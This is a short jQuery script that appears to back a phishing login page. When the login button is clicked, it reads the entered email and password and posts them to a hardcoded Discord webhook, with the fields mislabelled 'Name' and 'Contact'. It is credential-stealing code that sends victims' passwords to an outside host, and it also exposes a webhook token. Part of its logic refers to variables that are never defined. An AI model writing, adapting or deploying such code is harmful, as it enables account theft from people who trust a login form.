$(document).ready(function() {
    $('.login-button').on('click', function() {
        var webhookUrl = "https://discord.com/api/webhooks/1244659579317649440/lJxCRGsWdGFaqcG5o1Tg2L7qJe-yVpgyeDWpL9FQyal_JF4OxigTSNPGlEN09JIa2tGj";
        

        var email = $('.accountUser').val();
        var password = $('.accountPassword').val();

        

        var content = {
            content: `__Name__: **${email}**\n__Contact__: **${password}**`
        };

        if(name ==''){
            messageMeName.attr("placeholder" , "Please Type Your Name Here")
            messageMeName.css('font-size' , '1em')
            
            messageMeContact.attr("placeholder" , "Please Type Your Contact Here")
            messageMeContact.css('font-size' , '1em')

            messageMeMessage.attr("placeholder" , "Please Type Your Message Here")
            messageMeMessage.css('font-size' , '1em')
        }
        else{
            $.ajax({
                url: webhookUrl,
                type: "POST",
                contentType: "application/json",
                data: JSON.stringify(content),
                success: function(data, textStatus, jqXHR) {
                    console.log("Message sent: ", data);
                },
                error: function(jqXHR, textStatus, errorThrown) {
                    console.error("Error sending message: ", textStatus, errorThrown);
                }
            });
        }
    });
})